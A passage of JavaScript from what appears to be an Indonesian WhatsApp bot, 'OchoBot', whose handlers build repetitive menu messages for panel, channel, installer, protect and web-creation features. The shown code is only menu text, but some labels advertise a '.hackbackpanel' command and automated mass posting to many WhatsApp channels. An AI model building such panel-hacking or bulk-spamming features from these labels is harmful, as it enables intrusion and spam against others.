    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨* ]
┃ ϟ .brat
┃ ϟ .tourl
┃ ϟ .tourl2
┃ ϟ .berita
┃ ϟ .ssweb
┃ ϟ .translate
┃ ϟ .infogempa
┃ ϟ .infocuaca
┃ ϟ .wallpaper
┃ ϟ .shortlink
┃ ϟ .shortlink-dl
╰━━━━━━━━━━━━━━━━━━━━
  `;
await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "channelmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗠𝗘𝗡𝗨* ]
┃ ϟ .jpmchmenu
┃ ϟ .jpmchteks
┃ ϟ .jpmchbutton
┃ ϟ .jpmchfoto
┃ ϟ .jpmchvideo
┃ ϟ .jpmchaudio
┃ ϟ .jpmchdoc
┃ ϟ .setdelayjpmch
┃ ϟ .setbotjpmch
┃ ϟ .autojpmch
┃ ϟ .addteks
┃ ϟ .delteks
┃ ϟ .listteks
┃ ϟ .statusjpmch
┃ ϟ .jpmchjumlah
┃ ϟ .jpmchvip
┃ ϟ .addptjs
┃ ϟ .delptjs
┃ ϟ .addownjs
┃ ϟ .delownjs
┃ ϟ .addid
┃ ϟ .addidch
┃ ϟ .addallid
┃ ϟ .delid
┃ ϟ .delallid
┃ ϟ .listid
┃ ϟ .seturlsatu
┃ ϟ .seturldua
┃ ϟ .joinchannel
┃ ϟ .createch
┃ ϟ .sync
┃ ϟ .antikatach
┃ ϟ .jpmchnew
┃ ϟ .listch
╰━━━━━━━━━━━━━━━━━━━━
  `

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installermenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .hackbackpanel
┃ ϟ .installpanel
┃ ϟ .uninstallpanel
┃ ϟ .installtema
┃ ϟ .uninstallthema
┃ ϟ .startwings
┃ ϟ .subdomain
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmchmenu": {
    // Mendapatkan waktu, tanggal, dan hari saat ini dengan zona waktu WIB (GMT+7)
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

┏━━━━━⫷ JPMCH MENU ⫸━━━
┃➵ jpmch ( Own Js )
┃➵ jpmchpt ( Pt Js )
┃➵ addownjs
┃➵ addptjs
┃➵ delownjs
┃➵ delptjs
┃➵ listownjs
┃➵ listptjs
┃➵ setbotjpmch ( Bot On/Off )
┃➵ setdelayjpmch ( Delay Antar Ch )
┃➵ sync ( Add Id Otomatis )
┃➵ addid (Channel)
┃➵ addidch ( Tanpa Id Channel )
┃➵ addallid (Semua Id Channel)
┃➵ delid (Channel)
┃➵ delallid (Semua Id Channel)
┃➵ listid ( List Id Channel)
┃➵ autojpmch ( Otomatis Kirim )
┃➵ addteks ( Tambah Teks Yg Di Autojpmch )
┃➵ delteks ( Hapus Teks Yg Di Autojpmch )
┃➵ listteks ( List Teks Yg Di Autojpmch )
┃➵ channelmenu ( All Fitur Channel )
┃➵ antikatach ( Otomatis Hapus Kata Terlarang )
┃➵ jpmchnew ( Jpmch Tanpa Id )
┃➵ listch ( List Ch Lu Admin )
┗━━━━━━━━━━━━⭓

> Hallo Ini Adalah Menu Jpmch Khusus Open Own/Pt Jasher Al Luffy
> Jika Ingin Setting Cd Own Js Di setting.js
> Kalo Autojpmch Itu Teks Dll Cek Pake .listteks
> Jika Ada Error Atau Mau Fitur Lainnya Chat Al Luffy
*[ Gausah Banyak Bacot Intinya Jeda Sayang ]*`;

    await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran, 
                video: fs.readFileSync('./media/reply.jpg'), // diganti juga ke foto agar konsisten
                serverId: 200
            }
        }
    }, { quoted: qtext });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "protectmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*

*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .installprotect1
┃ ϟ .installprotect2
┃ ϟ .installprotect3
┃ ϟ .installprotect4
┃ ϟ .installprotect5
┃ ϟ .installprotect6
┃ ϟ .installprotect7
┃ ϟ .installprotect8
┃ ϟ .installprotect9
┃ ϟ .installprotect10
┃ ϟ .installprotect11
┃ ϟ .installprotect12
┃ ϟ .installprotect13
┃ ϟ .installprotect14
┃ ϟ .installprotect15
┃ ϟ .installprotect16
┃ ϟ .installprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .uninstallprotect1
┃ ϟ .uninstallprotect2
┃ ϟ .uninstallprotect3
┃ ϟ .uninstallprotect4
┃ ϟ .uninstallprotect5
┃ ϟ .uninstallprotect6
┃ ϟ .uninstallprotect7
┃ ϟ .uninstallprotect8
┃ ϟ .uninstallprotect9
┃ ϟ .uninstallprotect10
┃ ϟ .uninstallprotect11
┃ ϟ .uninstallprotect12
┃ ϟ .uninstallprotect13
┃ ϟ .uninstallprotect14
┃ ϟ .uninstallprotect15
┃ ϟ .uninstallprotect16
┃ ϟ .uninstallprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addsp
┃ ϟ .delsp
┃ ϟ .resetsp
┃ ϟ .listsp
┃ ϟ .addop
┃ ϟ .delop
┃ ϟ .resetop
┃ ϟ .listop
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "createwebmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*

*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗖𝗥𝗘𝗔𝗧𝗘 𝗪𝗘𝗕 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗦𝗘𝗟𝗟𝗘𝗥 𝗪𝗘𝗕* ]
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ochomenu":
case "menuslide": {
    try {
        // =========================
        // DATE, TIME, NAME
        // =========================
        const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
        const day = days[currentDate.getDay()];
        const date = currentDate.toLocaleDateString("id-ID", {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        const time = currentDate.toLocaleTimeString("id-ID");

        let name = m.pushName || "Pengguna"; // ✅

        // =========================
        // PREPARE MEDIA
        // =========================
        let imgsc = await prepareWAMessageMedia(
            { image: { url: global.image.logo } },
            { upload: conn.waUploadToServer }
        );

        // =========================
        // TEKS MENU
        // =========================
        let teks = `\`▧✨ O C H O B O T ✨▧\`

*INFO BOT OCHOBOT*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*

*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*`;

        // =========================
        // GENERATE CAROUSEL
        // =========================
        const msgii = await generateWAMessageFromContent(m.chat, {
            ephemeralMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: teks
                        }),
                        contextInfo: { mentionedJid: [m.sender] },
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [

                                // ================= SLIDE 2 (NEW MENU) ================
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭━━━━[ *𝗡𝗘𝗪 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createwebmenu
┃ ϟ .menuslide
┃ ϟ .upswgc
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
